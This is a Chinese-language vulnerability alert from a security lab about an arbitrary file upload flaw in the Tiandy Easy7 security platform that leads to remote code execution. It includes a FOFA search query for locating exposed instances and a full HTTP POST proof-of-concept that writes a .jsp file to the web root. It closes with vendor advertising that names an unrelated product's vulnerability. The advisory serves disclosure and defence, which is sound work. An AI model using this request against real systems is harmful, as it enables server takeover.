#  【漏洞预警】天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞  
by 融云安全-sm
                    by 融云安全-sm  融云攻防实验室   2026-03-05 09:37  
  
**漏洞名称：**  
  
天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞  
  
**组件详情：**  
  
天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞是“天地伟业Easy7综合安防管理平台”中存在的高危安全缺陷。攻击者可通过平台地图服务模块的文件上传接口（/uploadMapServerBgImage），绕过安全限制上传恶意脚本文件，进而获取服务器控制权限，导致远程代码执行（RCE），/uploadMapServerBgImage（常见完整路径为/api/v1/uploadMapServerBgImage、/api/uploadMapServerBgImage、/map/uploadMapServerBgImage等变体）。  
**影响范围：**  
- 受影响的 **Easy7 平台特定版本**  
（具体版本号通常由厂商在安全公告中明确，公开资料中常描述为“多个受影响版本”）。  
  
- 将 Web 管理界面暴露在公网或不可信网络内的实例风险最高。  
  
**漏洞类型：**  
  
高危 - 任意文件上传，可导致 远程代码执行；根本原因是服务端验证绕过。  
  
**利用条件：**  
  
1.用户认证： 通常需要低权限用户认证（即攻击者需要先获取一个有效账户登录）。部分利用方式可能在结合其他漏洞（如越权）时可实现未授权访问。  
  
2.前置条件： 目标系统必须启用并存在存在漏洞的“地图服务”或相关功能模块，且攻击者能够访问到该上传接口。  
  
3.触发方式： 攻击者通过构造特殊的 HTTP POST 请求，将包含恶意代码的文件（如 .jsp、.asp、.php的WebShell）伪装成图片（如修改数据包中的 Content-Type为 image/jpeg，或使用双后缀名 shell.jpg.jsp等方式），绕过前端和后端的过滤检查，上传至服务器可访问的Web目录。  
  
**综合评价：**  
  
1.攻击途径： 网络  
  
2.攻击复杂度： 低  
  
3.所需权限： 通常需低权限用户（存在未授权利用可能时风险剧增）  
  
4.用户交互： 无需  
  
5.影响范围： 可完全接管服务器，影响机密性、完整性、可用性。  
  
6.综合评分： 高危 (CVSS 3.x: 8.0-9.0， 具体取决于是否需要认证)  
  
**官方解决方案：**  
  
立即联系“天地伟业”官方，获取最新的安全补丁并升级到无漏洞的版本。这是最根本的解决方案。  
  
  
  
**复现情况**  
  
  
f  
ofa  
：  
  
body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"  
  
1.上传文件到x.jsp,访问  
/Easy7/x.jsp  
得到结果  
```
POST /Easy7/rest/file/uploadMapServerBgImage HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Connection: close
Content-Length: 280
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Accept-Encoding: gzip

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadParams"

[{"path": "/", "name": "x.jsp"}]
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.png"
Content-Type: image/png

1111111111111111111
------WebKitFormBoundary--
```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrjUMg5IhbmaUghSep10ibIKeicMd35ickuG5Ca1PZzZibkPEvTIZphzhJP4e6qdxg1gyIGqKYR7TR4hZGhibQnhYq8ltBzicZxr683P4/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=1 "")  
  
2.渝融云NTM入侵检测系统已支持  
天地伟业Easy7 uploadMapServerBgImage 文件上传漏洞  
检测  
（入侵检测合作可私聊公众号）  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrgdYrn78WqSaHiaQCOialThWnRjC4ZCgYxOl96FibjdswTd03Jvrg1YkhFWwmwgXgiamkKQSpwZ4hRSA1S2kxzCNwgJQkph4AONRKs/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=2 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrhHoAqYEnibT7szia93yMIl38W4icTxKlp9jhmM5rlzm3yx6ibg6HzIAkxAl1c12hesZX4xTLqk4xYCfjhhxOQX4IdX8EQJ5t5jibE4/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=3 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/w8NHw6tcQ5wicTzaxopgE26TXk6BicVDCkRV2P7zLEqkMiarB6Gq7gwAfxowKPPDGI0iahiaOkO55LooibEGtWxj9Biag/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
**渝融云解决方案-渝融云NTM全流量分析探针**  
  
**已添加监测规则**  
，可实时监控  
青龙面板 网站管理系统 command-run 远程代码执行漏洞  
  
设备简介：渝融云NTM全流量分析探针是一款集流量分析、威胁检测与行为审计于一体的智能化网络流量监测平台。系统通过对网络全流量的实时采集与深度解析，帮助用户实现网络态势的“全景透视”。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrgdae3abUEuH7fEsZBa8MUeYzl1sX49ZIkV4YrxbibpYKCDBPPLezxaQ39iaqXZpCROceaOzPo5Q5qyWw5M7aIErhxdOVhpHgCHU/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4 "")  
  
